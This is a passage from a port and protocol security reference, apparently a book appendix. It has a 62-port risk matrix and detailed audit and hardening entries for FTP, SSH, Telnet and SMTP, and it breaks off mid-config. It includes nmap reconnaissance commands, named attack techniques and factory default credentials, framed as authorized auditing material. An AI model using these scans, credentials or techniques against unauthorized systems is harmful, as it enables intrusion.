# Appendix A: Complete TCP/UDP Port & Enterprise Protocol Security Encyclopedia

> **Publication Context**: *THE SRI LANKAN ELITE HACKER'S BIBLE: Complete University & Professional Cybersecurity Reference Encyclopedia*  
> **Classification**: Academic & Enterprise Network Security Reference Manual  
> **Scope**: Exhaustive architectural analysis, RFC specifications, protocol state machines, cryptographic negotiation mechanics, authorized security auditing checklists, diagnostic commands, configuration weaknesses, and Center for Internet Security (CIS) / NIST SP 800-53 hardening controls across 62 critical enterprise TCP/UDP ports and protocols.

---

## 0. Architectural Foundations of Transport Layer Security & Port Allocation

Enterprise network defense and authorized security auditing require a rigorous understanding of how transport-layer multiplexing (OSI Layer 4) binds network sockets to application-layer daemons (OSI Layer 7). Under IANA (Internet Assigned Numbers Authority) RFC 6335, the 16-bit unsigned integer port space ($0$ to $65535$) is partitioned into three distinct administrative boundaries:

1. **System / Well-Known Ports ($0 - 1023$)**: On POSIX-compliant kernels (Linux, BSD, macOS), binding a listening socket (`bind()` syscall) to a port below `1024` requires elevated kernel privileges—specifically the `CAP_NET_BIND_SERVICE` Linux capability or effective UID `0` (`root`). Historically, this boundary prevented unprivileged local users from spoofing core infrastructure daemons such as SSH (`22`) or DNS (`53`). Modern containerized environments can bypass or modify this boundary via `sysctl net.ipv4.ip_unprivileged_port_start`.
2. **User / Registered Ports ($1024 - 49151$)**: Assigned by IANA for specific enterprise services (e.g., MSSQL `1433`, PostgreSQL `5432`, Kubernetes API `6443`, Redis `6379`). Any unprivileged user-space process can bind to these ports unless restricted by Mandatory Access Control (SELinux/AppArmor) or local host firewall policies (`nftables`/`iptables`).
3. **Dynamic / Private / Ephemeral Ports ($49152 - 65535$)**: Used for temporary outbound client source ports during TCP three-way handshakes (`SYN` -> `SYN/ACK` -> `ACK`) or UDP request-response transactions. Note that modern Linux kernels typically expand the ephemeral port range to `32768 - 60999` (`net.ipv4.ip_local_port_range`).

### Summary Matrix of Enterprise Network Ports (Entries 1–62)

| # | Port(s) | Transport | Protocol / Service | Primary RFC / Spec | Default Encryption | Critical Risk Profile |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| 01 | `20`, `21` | TCP | FTP (File Transfer Protocol) | RFC 959, RFC 4217 | Cleartext (FTPS opt) | Credential interception, bounce attacks, anonymous write |
| 02 | `22` | TCP | SSH (Secure Shell) | RFC 4251–4254 | Encrypted (SSHv2) | Weak KEX/ciphers, exposed private keys, agent forwarding |
| 03 | `23` | TCP | Telnet | RFC 854, RFC 855 | Cleartext | Total session hijacking, credential sniffing, zero MITM protection |
| 04 | `25`, `465`, `587` | TCP | SMTP / SMTPS / Submission | RFC 5321, RFC 8314 | Opportunistic / TLS | Open mail relay, user enumeration (`VRFY`/`EXPN`), STARTTLS stripping |
| 05 | `53` | UDP / TCP | DNS (Domain Name System) | RFC 1035, RFC 4033 | Cleartext (DoT/DoH opt) | Zone transfer (`AXFR`), cache poisoning, DNS amplification DDoS |
| 06 | `67`, `68` | UDP | DHCP (Dynamic Host Config) | RFC 2131, RFC 3315 | Cleartext | Rogue DHCP server, DHCP starvation, WPAD/DNS poisoning |
| 07 | `69` | UDP | TFTP (Trivial FTP) | RFC 1350 | Cleartext | Unauthenticated config extraction (VoIP/Cisco router images) |
| 08 | `80`, `443` | TCP / UDP | HTTP / HTTPS (HTTP/1.1, 2, 3) | RFC 9110, RFC 9114 | Cleartext / TLS 1.3 | TLS downgrade, missing security headers, web app vulnerabilities |
| 09 | `88` | TCP / UDP | Kerberos v5 Authentication | RFC 4120 | Encrypted tickets | AS-REP roasting, Kerberoasting, Pass-the-Ticket, Golden/Silver Ticket |
| 10 | `110`, `995` | TCP | POP3 / POP3S | RFC 1939, RFC 8314 | Cleartext / TLS | Cleartext `USER`/`PASS` authentication, brute-force attacks |
| 11 | `111` | TCP / UDP | RPCbind / Portmapper | RFC 1833, RFC 5531 | Cleartext | RPC service enumeration, NFS/NIS port discovery, DDoS amplification |
| 12 | `123` | UDP | NTP (Network Time Protocol) | RFC 5905 | Cleartext (NTS opt) | `monlist` DDoS amplification, time-shifting replay attacks (Kerberos/TLS) |
| 13 | `135` | TCP / UDP | MSRPC Endpoint Mapper | MS-RPCE / DCE 1.1 | Packet Privacy opt | DCOM/WMI lateral movement, interface UUID enumeration, coercion |
| 14 | `137`–`139` | UDP / TCP | NetBIOS (NS, DGM, SSN) | RFC 1001, RFC 1002 | Cleartext | NBNS name poisoning, NTLMv1/v2 hash capture, null session enumeration |
| 15 | `143`, `993` | TCP | IMAP / IMAPS | RFC 9051, RFC 8314 | Cleartext / TLS | Credential harvesting, mailbox exfiltration, SASL PLAIN exposure |
| 16 | `161`, `162` | UDP | SNMP / SNMP Trap | RFC 3411–3418 | Cleartext (v1/v2c) | Default `public`/`private` communities, full MIB config read/write |
| 17 | `179` | TCP | BGP (Border Gateway Protocol) | RFC 4271, RFC 8205 | Cleartext (TCP-AO) | Autonomous System route hijacking, BGP session reset (`RST`), prefix leaks |
| 18 | `389`, `636`, `3268` | TCP / UDP | LDAP / LDAPS / Global Catalog | RFC 4511 | Cleartext / TLS | Anonymous bind, LDAP injection, unsigned/unsealed NTLM relay |
| 19 | `445` | TCP | SMB (Server Message Block) | MS-SMB2 (v2/v3) | Signing/Encryption opt | SMB relay when signing disabled, share exposure, legacy SMBv1 RCE |
| 20 | `500`, `4500` | UDP | IKE / IPsec NAT-T | RFC 7296, RFC 4301 | Encrypted (ESP/IKEv2) | IKEv1 Aggressive Mode PSK offline cracking, weak DH groups |
| 21 | `514`, `6514` | UDP / TCP | Syslog / TLS Syslog | RFC 5424, RFC 5425 | Cleartext / TLS | Log spoofing/injection, unencrypted sensitive audit trail transit |
| 22 | `548` | TCP | AFP (Apple Filing Protocol) | Apple AFP Spec | DHX2 / Cleartext | Legacy macOS file share exposure, weak UAM authentication |
| 23 | `623` | UDP / TCP | IPMI (RMCP+ Baseboard Mgmt) | IPMI v2.0 Spec | RMCP+ | RAKP HMAC-SHA1 password hash retrieval, Cipher Zero auth bypass |
| 24 | `873` | TCP | Rsync Daemon | Rsync Protocol Spec | Cleartext | Unauthenticated module listing, arbitrary file read/write (`~/.ssh`) |
| 25 | `902`, `903` | TCP / UDP | VMware ESXi Auth / Console | VMware vSphere Spec | TLS / NFC | Hypervisor management exposure, VM disk (VMDK) direct stream access |
| 26 | `1080` | TCP / UDP | SOCKS Proxy (SOCKS4/SOCKS5) | RFC 1928, RFC 1929 | Cleartext | Open proxy abuse, internal network pivoting, SSRF bypass |
| 27 | `1433`, `1434` | TCP / UDP | Microsoft SQL Server (TDS) | MS-TDS | TLS opt | `sa` brute-force, `xp_cmdshell` OS command execution, linked server hopping |
| 28 | `1521` | TCP | Oracle TNS Listener | Oracle Net Services | Native Enc opt | SID/Service Name enumeration, TNS poisoning, default DB accounts |
| 29 | `1883`, `8883` | TCP | MQTT (IoT Message Broker) | OASIS MQTT v5.0 | Cleartext / TLS | Wildcard `#` topic subscription, unauthenticated telemetry injection |
| 30 | `2049` | TCP / UDP | NFS (Network File System) | RFC 7530 (v4), RFC 1813 | RPCSEC_GSS opt | `no_root_squash` privilege escalation, world-readable exports |
| 31 | `2181`, `2888`, `3888`| TCP | Apache ZooKeeper | ZooKeeper Spec | TLS opt | Unauthenticated `envi`/`dump` 4-letter words, Kafka/Hadoop cluster takeover |
| 32 | `2375`, `2376` | TCP | Docker Daemon API | Docker Engine API | Cleartext / mTLS | Immediate host root takeover via privileged container bind-mount |
| 33 | `3128` | TCP | Squid HTTP Forward Proxy | RFC 9110 | Cleartext / TLS | Internal cloud metadata (`169.254.169.254`) pivoting, ACL bypass |
| 34 | `3306`, `33060` | TCP | MySQL / MariaDB / X Protocol | MySQL Client/Server | TLS opt | Root remote login, `LOAD DATA LOCAL INFILE`, `INTO OUTFILE` webshell |
| 35 | `3389` | TCP / UDP | RDP (Remote Desktop Protocol) | MS-RDPBCGR | TLS / CredSSP (NLA) | BlueKeep/DejaBlue when unpatched, NLA downgrade, credential stuffing |
| 36 | `4369` | TCP | Erlang Port Mapper (EPMD) | Erlang Distribution | Cleartext | Node enumeration, Erlang cookie RCE on port `25672` (RabbitMQ/CouchDB) |
| 37 | `5000` | TCP | Docker Registry v2 API | OCI Distribution Spec | TLS opt | Unauthenticated `/v2/_catalog` image pull, supply-chain poisoning via push |
| 38 | `5432` | TCP | PostgreSQL Wire Protocol | PostgreSQL v3.0 Spec | TLS / SCRAM-SHA-256 | `trust` auth in `pg_hba.conf`, `COPY ... FROM PROGRAM` command execution |
| 39 | `5601` | TCP | Kibana Web UI / API | Elastic Stack Spec | TLS opt | Unauthenticated dashboard access, prototype pollution / Timelion RCE |
| 40 | `5672`, `15672` | TCP | RabbitMQ (AMQP / Mgmt UI) | OASIS AMQP 0-9-1/1.0| Cleartext / TLS | Default `guest:guest` credentials, message queue poisoning |
| 41 | `5900`–`5909` | TCP | VNC (Remote Framebuffer RFB) | RFC 6143 | DES challenge / None | Auth-none desktop access, weak 8-character truncated DES password |
| 42 | `5984` | TCP | Apache CouchDB HTTP API | CouchDB REST Spec | Cleartext / TLS | "Admin Party" (unauthenticated admin), `/_all_dbs` data exfiltration |
| 43 | `5985`, `5986` | TCP | WinRM (WS-Management) | DMTF DSP0226 | Kerberos/NTLM/HTTPS | Evil-WinRM lateral movement, Pass-the-Hash remote PowerShell |
| 44 | `6379` | TCP | Redis (RESP Protocol) | RESP2 / RESP3 Spec | Cleartext (TLS opt) | Unauthenticated `CONFIG SET dir`, SSH key injection, Lua sandbox escape |
| 45 | `6443`, `8443` | TCP | Kubernetes API Server | Kubernetes API Spec | TLS / mTLS / OIDC | Anonymous RBAC cluster-admin misconfiguration, leaked service account JWTs |
| 46 | `7001`, `7002` | TCP | Oracle WebLogic Server | T3 / IIOP / HTTP | Cleartext / TLS | Java T3/IIOP deserialization RCE, `/console` auth bypass |
| 47 | `8000`, `8080`, `8443`| TCP | Alternate HTTP / Tomcat / Admin| RFC 9110 | Cleartext / TLS | Exposed Tomcat `/manager/html`, Spring Boot `/actuator/env`, debug servers |
| 48 | `8086` | TCP | InfluxDB HTTP API | InfluxDB v1/v2 API | Cleartext / TLS | Blank `auth-enabled = false`, `/query?q=SHOW+DATABASES` dump |
| 49 | `8500`, `8600` | TCP / UDP | HashiCorp Consul (HTTP / DNS) | Consul API Spec | Cleartext / mTLS | ACLs disabled by default, remote script checks RCE (`/v1/agent/check/register`)|
| 50 | `9000` | TCP | PHP-FPM FastCGI / SonarQube | FastCGI / HTTP Spec | Cleartext | Direct FastCGI `PHP_VALUE auto_prepend_file` RCE, SonarQube default admin |
| 51 | `9042`, `9160` | TCP | Apache Cassandra (CQL / Thrift)| CQL Binary v4/v5 | Cleartext / TLS | `AllowAllAuthenticator` default config, unauthenticated keyspace dump |
| 52 | `9090`, `9100` | TCP | Prometheus / Node Exporter | OpenMetrics / HTTP | Cleartext / TLS | `/metrics` infrastructure recon, `/-/reload` or `/api/v1/admin/tsdb` abuse |
| 53 | `9200`, `9300` | TCP | Elasticsearch (REST / Transport)| Elastic Wire Spec | TLS (v8+ default) | Unauthenticated `/_search` full index dump, cluster node join on `9300` |
| 54 | `10250`, `10255` | TCP | Kubernetes Kubelet API | Kubelet API Spec | TLS | `--anonymous-auth=true` allows `/run/<ns>/<pod>/<container>` RCE |
| 55 | `11211` | TCP / UDP | Memcached | Memcached ASCII/Bin | Cleartext (SASL opt) | `stats cachedump` session hijacking, 51,000x UDP DDoS amplification |
| 56 | `27017`–`27019` | TCP | MongoDB Wire Protocol | OP_MSG Wire Spec | Cleartext / TLS | Missing `security.authorization: enabled`, full NoSQL database dump |
| 57 | `50000` | TCP | SAP Router / Jenkins Agent | SAP NI / JNLP | Cleartext / TLS | SAP internal network routing bypass, Jenkins agent port manipulation |
| 58 | `51820` | UDP | WireGuard VPN | Noise_IKpsk2 | ChaCha20-Poly1305 | Compromised static Curve25519 private keys, missing `PersistentKeepalive` ACLs |
| 59 | `2000`, `5060`, `5061`| UDP / TCP | Cisco SCCP / SIP VoIP | RFC 3261 | Cleartext / TLS | SIP `INVITE` toll fraud, extension enumeration (`REGISTER`), RTP eavesdropping|
| 60 | `3260` | TCP | iSCSI Target | RFC 7143 | CHAP opt | Unauthenticated IQN target discovery, raw block storage mounting |
| 61 | `26257`, `8080` | TCP | CockroachDB (SQL / Admin UI) | PostgreSQL Wire | mTLS / Insecure flag| `--insecure` cluster flag exposes full distributed SQL and Web UI |
| 62 | `61616`, `8161` | TCP | Apache ActiveMQ (OpenWire/UI) | OpenWire / HTTP | Cleartext / TLS | OpenWire ExceptionResponse class-loading RCE (CVE-2023-46604), `admin:admin` |

---

## Section 1: Legacy & Core Infrastructure Protocols (Entries 01–15)

---

### [PORT-01] Ports 20/TCP, 21/TCP (989/TCP, 990/TCP) — File Transfer Protocol (FTP / FTPS)

* **Transport Protocol & IANA Assignment**:
  * `21/TCP`: Control Connection (Command and response channel).
  * `20/TCP`: Active Mode Data Connection (Server-initiated outbound data stream from source port `20`).
  * `990/TCP` (Control) & `989/TCP` (Data): Implicit FTPS (FTP over TLS).
  * Ephemeral TCP Ports (`1024–65535`): Passive Mode (`PASV` / `EPSV`) data channels allocated dynamically by the server.
* **RFC Specification**: RFC 959 (Base Specification), RFC 2228 (FTP Security Extensions), RFC 2428 (IPv6 and NAT Extensions `EPSV`/`EPRT`), RFC 4217 (Securing FTP with TLS — Explicit FTPS via `AUTH TLS`).
* **Architecture & Handshake Overview**:
  FTP uses a dual-channel out-of-band architecture that separates control signaling from bulk data transfer.
  1. **Control Channel Initialization**: Client establishes a TCP 3-way handshake to `21/TCP`. The server responds with a `220` greeting banner (often disclosing daemon software and version, e.g., `vsFTPd 3.0.3`, `ProFTPD 1.3.7a`, `Pure-FTPd`).
  2. **Authentication State Machine**: The client issues `USER <username>`, receiving `331 Please specify the password`, followed by `PASS <password>`. In standard RFC 959 FTP, both commands traverse the wire in raw ASCII cleartext. If Explicit FTPS (RFC 4217) is enforced, the client sends `AUTH TLS` immediately after `220`, performs a TLS handshake, and negotiates `PBSZ 0` and `PROT P` (Private data channel protection) before sending `USER`.
  3. **Data Channel Negotiation**:
     * **Active Mode (`PORT` / `EPRT`)**: The client opens a local ephemeral port and sends `PORT h1,h2,h3,h4,p1,p2` (where target IP is `h1.h2.h3.h4` and port is $(p1 \times 256) + p2$). The server initiates a TCP connection *from* `20/TCP` *to* the client's specified IP and port.
     * **Passive Mode (`PASV` / `EPSV`)**: The client sends `PASV`; the server replies `227 Entering Passive Mode (h1,h2,h3,h4,p1,p2)` or `229 Entering Extended Passive Mode (|||port|)`. The client then initiates a second TCP connection to the server's ephemeral port to stream directory listings (`LIST`) or files (`RETR` / `STOR`).
* **Authorized Security Audit Checklist**:
  * Verify whether anonymous authentication (`USER anonymous` / `PASS anonymous@`) is permitted and test whether anonymous sessions have write permissions (`STOR`, `MKD`) in web-accessible or script-execution directories.
  * Inspect whether `AUTH TLS` is supported and strictly required prior to `USER`/`PASS` submission, and ensure `PROT P` encrypts the passive data channel.
  * Test for **FTP Bounce Attacks** (`PORT` command supplying an internal RFC 1918 IP address and target port like `10,0,0,5,0,22` to use the FTP server as an unwitting port scanner or proxy).
  * Check for directory traversal or symlink traversal outside the user's home directory (`chroot` jail escape) and evaluate daemon version against known RCE/backdoor CVEs (e.g., `ProFTPD` `mod_copy` `SITE CPFR`/`SITE CPTO` unauthenticated file copy).
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap comprehensive FTP audit: banner, anonymous login, bounce check, and TLS support
  nmap -sV -p 21,990 --script ftp-anon,ftp-bounce,ftp-syst,ssl-enum-ciphers <target-ip>

  # 2. Verify Explicit FTPS (AUTH TLS) certificate chain and cipher negotiation via OpenSSL
  openssl s_client -connect <target-ip>:21 -starttls ftp -tls1_3 -showcerts

  # 3. cURL passive directory listing over Explicit FTPS requiring strict TLS verification
  curl --ssl-reqd --tlsv1.2 --ftp-pasv -u "<username>:<password>" ftp://<target-ip>:21/
  ```
* **Common Configuration Weaknesses**:
  * `anonymous_enable=YES` combined with `anon_upload_enable=YES` or `anon_mkdir_write_enable=YES` in `/etc/vsftpd.conf`.
  * Missing `chroot_local_user=YES`, allowing authenticated local users to traverse up to `/etc/passwd` or `/var/www/html`.
  * Permitting fallback to cleartext authentication (`force_local_logins_ssl=NO`) or failing to restrict passive port ranges (`pasv_min_port` / `pasv_max_port`), forcing firewall administrators to open all ephemeral ports (`1024-65535`).
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Decommission in Favor of SFTP**: Replace FTP/FTPS with OpenSSH `internal-sftp` over port `22/TCP` wherever possible (CIS Distribution Independent Linux Benchmark 2.2.10).
  * **Strict `vsftpd` Hardening (`/etc/vsftpd.conf`)**:
    ```ini
    anonymous_enable=NO
    local_enable=YES
    write_enable=YES
    chroot_local_user=YES
    allow_writeable_chroot=NO
    ssl_enable=YES
    allow_anon_ssl=NO
    force_local_data_ssl=YES
    force_local_logins_ssl=YES
    ssl_tlsv1_2=YES
    ssl_sslv2=NO
    ssl_sslv3=NO
    require_ssl_reuse=YES
    pasv_enable=YES
    pasv_min_port=50000
    pasv_max_port=50100
    port_promiscuous=NO
    ```
  * **NIST Mapping**: SC-8 (Transmission Confidentiality and Integrity), AC-6 (Least Privilege), CM-7 (Least Functionality).

---

### [PORT-02] Port 22/TCP — Secure Shell (SSH v2 / SFTP / SCP)

* **Transport Protocol & IANA Assignment**: `22/TCP` (Standard stream-oriented SSH daemon), `22/UDP` (Reserved; QUIC-based SSH proposals such as SSH3 utilize UDP/QUIC).
* **RFC Specification**: RFC 4251 (SSH Protocol Architecture), RFC 4252 (Authentication Protocol), RFC 4253 (Transport Layer Protocol), RFC 4254 (Connection Protocol), RFC 8332 (RSA Keys with SHA-256/512), RFC 8709 (Ed25519 and Ed448 Public Key Algorithms).
* **Architecture & Handshake Overview**:
  SSHv2 operates as a layered cryptographic protocol stack over a single multiplexed TCP connection:
  1. **Protocol Version Exchange**: Immediately after TCP handshake, both endpoints exchange identification strings in the format `SSH-2.0-softwareversion SP comments CR LF` (e.g., `SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13`). This string is bound into the subsequent key exchange hash $H$ to prevent downgrade attacks.
  2. **Key Exchange (`SSH_MSG_KEXINIT` -> Diffie-Hellman)**: Both sides send a list of supported algorithms for four categories: Key Exchange (KEX, e.g., `curve25519-sha256`, `sntrup761x25519-sha512@openssh.com`), Host Key (`ssh-ed25519`, `rsa-sha2-512`), Symmetric Cipher (`chacha20-poly1305@openssh.com`, `aes256-gcm@openssh.com`), and MAC (`umac-128-etm@openssh.com`). Ephemeral Diffie-Hellman key exchange produces a shared secret $K$ and an exchange hash $H$ (which serves as the immutable session identifier on first KEX). The server signs $H$ with its private host key so the client can verify host authenticity against `~/.ssh/known_hosts`.
  3. **User Authentication Layer (`ssh-userauth`)**: Over the encrypted tunnel, the client authenticates via `publickey` (signing the session ID $H$ with the user's private key or FIDO2/U2F hardware token `sk-ssh-ed25519@openssh.com`), `gssapi-with-mic` (Kerberos), `keyboard-interactive` (PAM/TOTP MFA), or `password`.
  4. **Connection Layer (`ssh-connection`)**: Multiplexes encrypted logical channels for interactive PTY shells (`session`), `sftp` subsystem, TCP port forwarding (`direct-tcpip`, `forwarded-tcpip`), and UNIX domain socket / SSH agent forwarding (`auth-agent@openssh.com`).
* **Authorized Security Audit Checklist**:
  * Enumerate offered KEX, HostKey, Cipher, and MAC algorithms to verify absence of legacy primitives (`diffie-hellman-group1-sha1`, `diffie-hellman-group14-sha1`, `ssh-rsa` SHA-1 signatures, CBC-mode ciphers, `arcfour`/RC4, and non-EtM MACs vulnerable to **Terrapin Prefix Truncation CVE-2023-48795** when `chacha20-poly1305` or `*-cbc` + `*-etm` are paired without `strict-kex`).
  * Audit OpenSSH version for critical memory corruption or race condition vulnerabilities (e.g., **regreSSHion CVE-2024-6387** unauthenticated `SIGALRM` signal handler race condition in `sshd` on glibc systems).
  * Inspect `/etc/ssh/sshd_config` and user `~/.ssh/authorized_keys` for missing `command="..."`, `no-port-forwarding`, `no-agent-forwarding`, or `from="cidr"` restrictions on automation service keys.
  * Check if `PermitRootLogin` or `PasswordAuthentication` is enabled on Internet-facing bastions.
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap enumeration of SSHv2 KEX, Ciphers, MACs, and HostKey fingerprints
  nmap -sV -p 22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods \
    --script-args="ssh.user=root" <target-ip>

  # 2. Verbose SSH client connection inspection without authenticating (shows KEX & Strict-KEX)
  ssh -vvv -o BatchMode=yes -o ConnectTimeout=5 <target-ip> 2>&1 | grep -E "kex:|Server host key:|Authentications that can continue"

  # 3. Validate local sshd configuration syntax and dump effective runtime settings
  sudo sshd -t && sudo sshd -T | grep -E "permitrootlogin|passwordauthentication|kexalgorithms|ciphers|macs|allowtcpforwarding"
  ```
* **Common Configuration Weaknesses**:
  * Enabling `PasswordAuthentication yes` without Fail2ban/crowdsec or PAM MFA, enabling distributed credential-stuffing and brute-force attacks.
  * Leaving `AllowAgentForwarding yes` on shared jump hosts, allowing a root user on the jump host to hijack the UNIX domain socket in `/tmp/ssh-XXXX/agent.<pid>` and impersonate the connecting engineer across downstream servers.
  * Retaining legacy SHA-1 `ssh-rsa` host/user keys or weak Diffie-Hellman moduli (< 3072 bits in `/etc/ssh/moduli`).
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **CIS Linux Benchmark Section 5.2 (`/etc/ssh/sshd_config` Drop-in `/etc/ssh/sshd_config.d/00-hardening.conf`)**:
    ```sshconfig
    Protocol 2
    PermitRootLogin no
    MaxAuthTries 3
    MaxSessions 4
    LoginGraceTime 30
    PasswordAuthentication no
    PermitEmptyPasswords no
    KbdInteractiveAuthentication no
    PubkeyAuthentication yes
    AuthenticationMethods publickey
    AllowAgentForwarding no
    AllowTcpForwarding no
    X11Forwarding no
    PermitTunnel no
    ClientAliveInterval 300
    ClientAliveCountMax 2
    LogLevel VERBOSE
    KexAlgorithms sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512
    Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com
    MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,umac-128-etm@openssh.com
    HostKeyAlgorithms ssh-ed25519,sk-ssh-ed25519@openssh.com,rsa-sha2-512,rsa-sha2-256
    ```
  * **SSH Certificate Authority**: Replace static `authorized_keys` files with short-lived OpenSSH User Certificates (`TrustedUserCAKeys /etc/ssh/ca_user_key.pub`) minted via step-ca or HashiCorp Vault after OIDC/SAML hardware MFA authentication.

---

### [PORT-03] Port 23/TCP — Telnet (Teletype Network Protocol)

* **Transport Protocol & IANA Assignment**: `23/TCP` (Cleartext Telnet), `992/TCP` (Telnet over TLS — rarely deployed).
* **RFC Specification**: RFC 854 (Telnet Protocol Specification), RFC 855 (Telnet Option Specifications), RFC 1073 (Telnet Window Size Option `NAWS`), RFC 1572 (Telnet Environment Option `NEW-ENVIRON`).
* **Architecture & Handshake Overview**:
  Telnet implements the Network Virtual Terminal (NVT) abstraction, providing bidirectional, eight-bit byte-oriented communications.
  1. **Option Negotiation (`IAC` Commands)**: Control sequences are embedded in-band within the TCP stream prefixed by the Interpret As Command (`IAC`) byte `0xFF`. Commands follow a three-byte triplet: `IAC (0xFF)` + `[WILL (0xFB) | WONT (0xFC) | DO (0xFD) | DONT (0xFE)]` + `<Option Byte>`.
  2. **Subnegotiation (`SB` / `SE`)**: Extended parameters (such as terminal type `TTYPE` or environment variables `NEW-ENVIRON`) are exchanged between `IAC SB (0xFF 0xFA)` and `IAC SE (0xFF 0xF0)`.
  3. **Character-at-a-Time Transmission**: In default `DO ECHO` / `SUPPRESS GO AHEAD` modes, every single keystroke typed by the user (including `root` passwords) is transmitted in an individual TCP segment in unencrypted ASCII, echoed back by the server.
* **Authorized Security Audit Checklist**:
  * Immediately flag any listening `23/TCP` socket on enterprise networks, OT/ICS segments, network switches, UPS units, or IoT cameras as a **Critical/High** compliance violation (PCI-DSS v4.0 Requirement 2.2.7 / 4.2.1).
  * Capture system banners during connection setup, which frequently disclose embedded RTOS versions (VxWorks, BusyBox, Cisco IOS, MikroTik RouterOS).
  * Check for historical option-parsing vulnerabilities such as the **FreeBSD/NetBSD/GNU inetutils `NEW-ENVIRON` / `USER=-f root` authentication bypass** (e.g., CVE-2026-24061 / CVE-2007-0882 style `/bin/login` argument injection via `USER` environment variable).
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap Telnet banner, encryption support, and NTLM info disclosure check
  nmap -sV -p 23 --script telnet-encryption,telnet-ntlm-info,banner <target-ip>

  # 2. Capture raw IAC negotiation bytes using Netcat with hex dump
  nc -nv -w 3 <target-ip> 23 | xxd
  ```
* **Common Configuration Weaknesses**:
  * Legacy Cisco IOS routers/switches configured with `transport input all` or `transport input telnet` on `line vty 0 15`.
  * Embedded printers, PDU power strips, and industrial PLCs running default BusyBox `telnetd` with hardcoded factory credentials (`admin:admin`, `root:vizxv`).
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Complete Removal on Linux (CIS 2.1.x / 2.3.x)**:
    ```bash
    sudo systemctl stop inetd xinetd telnet.socket 2>/dev/null
    sudo apt-get purge -y telnetd inetutils-telnetd telnet
    ```
  * **Cisco IOS / NX-OS VTY Hardening**:
    ```ios
    line vty 0 15
     transport input ssh
     login authentication AAA_TACACS
     exec-timeout 5 0
    ```

---

### [PORT-04] Ports 25/TCP, 465/TCP, 587/TCP — Simple Mail Transfer Protocol (SMTP / SMTPS / Submission)

* **Transport Protocol & IANA Assignment**:
  * `25/TCP`: MTA-to-MTA (Mail Transfer Agent) relay across the public Internet.
  * `587/TCP`: Message Submission Agent (MSA) for authenticated Mail User Agents (MUAs) using Explicit TLS (`STARTTLS`).
  * `465/TCP`: Implicit TLS Message Submission (`SMTPS`), standardized by RFC 8314.
* **RFC Specification**: RFC 5321 (SMTP), RFC 3207 (SMTP over TLS / `STARTTLS`), RFC 4954 (SMTP Service Extension for Authentication `AUTH`), RFC 7208 (SPF), RFC 6376 (DKIM), RFC 7489 (DMARC), RFC 8461 (MTA-STS), RFC 7672 (SMTP DANE).
* **Architecture & Handshake Overview**:
  1. **Greeting & Extended Hello**: Upon TCP connection, the MTA responds with `220 mail.example.com ESMTP Postfix`. The client sends `EHLO client.example.com`, and the server returns a multiline `250-` list of supported extensions (`STARTTLS`, `AUTH PLAIN LOGIN`, `SIZE`, `PIPELINING`, `8BITMIME`, `SMTPUTF8`).
  2. **TLS Upgrade**: On ports `25` and `587`, the client issues `STARTTLS` (`220 2.0.0 Ready to start TLS`), completes a TLS handshake, and re-issues `EHLO` over the encrypted channel so capabilities (like `AUTH`) that are suppressed in cleartext can be advertised. On port `465`, the TLS handshake occurs immediately upon TCP connection.
  3. **Envelope & Payload Transaction**:
     * `MAIL FROM:<sender@domain.tld>` -> `250 2.1.0 Ok` (Return-Path / Bounce address).
     * `RCPT TO:<recipient@target.tld>` -> `250 2.1.5 Ok` (Envelope recipient).
     * `DATA` -> `354 End data with <CR><LF>.<CR><LF>` -> RFC 5322 Headers (`From:`, `To:`, `Subject:`) + Body -> `.` -> `250 2.0.0 Ok: queued`.
* **Authorized Security Audit Checklist**:
  * **Open Relay Testing**: Verify that unauthenticated connections on `25/TCP` cannot send mail from an external `MAIL FROM` domain to an external `RCPT TO` domain (`554 5.7.1 Relay access denied`).
  * **User Enumeration**: Check whether `VRFY`, `EXPN`, or timing/status code differences in `RCPT TO` disclose valid internal mailbox accounts.
  * **STARTTLS Stripping & Downgrade**: Verify whether MTA-STS (`_mta-sts.<domain>` TXT record + `https://mta-sts.<domain>/.well-known/mta-sts.txt`) and DNSSEC/DANE (`_25._tcp.<mx-host>` `TLSA` record) are configured to prevent active MITM attackers from replacing `250-STARTTLS` with `250-XXXXXXXX` in transit.
  * **SMTP Smuggling**: Test whether non-standard line endings (`<LF>.<CR><LF>` or `<CR>.<CR>`) allow smuggling a second spoofed email inside a single `DATA` stream across heterogeneous inbound/outbound MTAs (Postfix, Sendmail, Exchange).
  * **Email Authentication Records**: Audit DNS for strict SPF (`-all` hardfail), 2048-bit+ DKIM keys, and DMARC (`v=DMARC1; p=reject; pct=100;`).
* **Diagnostic & Auditing Commands**:
  ```bash
  # 1. Nmap audit for SMTP open relay, user enumeration, commands, and TLS ciphers
  nmap -sV -p 25,465,587 --script smtp-commands,smtp-open-relay,smtp-enum-users,ssl-enum-ciphers <target-ip>

  # 2. Inspect STARTTLS handshake and certificate chain on Port 25 / 587
  openssl s_client -connect <target-ip>:587 -starttls smtp -tls1_3 -brief

  # 3. Query SPF, DMARC, and MTA-STS records via dig
  dig +short TXT example.com _dmarc.example.com _mta-sts.example.com
  ```
* **Common Configuration Weaknesses**:
  * Overly permissive `mynetworks` in Postfix (`/etc/postfix/main.cf`), such as `mynetworks = 10.0.0.0/8` or `mynetworks_style = class`, allowing any compromised container or workstation to send unauthenticated spoofed internal phishing emails.
  * Permitting `AUTH PLAIN` or `AUTH LOGIN` prior to `STARTTLS` (`smtpd_tls_auth_only = no`).
* **CIS Hardening & NIST SP 800-53 Controls**:
  * **Postfix Hardening (`/etc/postfix/main.cf`)**:
    ```ini
    inet_interfaces = loopback-only   # On non-mail servers (CIS 2.2.15)
    # On dedicated MTAs:
    disable_vrfy_command = yes
    smtpd_helo_required = yes
    smtpd_tls_security_level = may
    smtpd_tls_auth_only = yes
    smtpd_tls_mandatory_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1
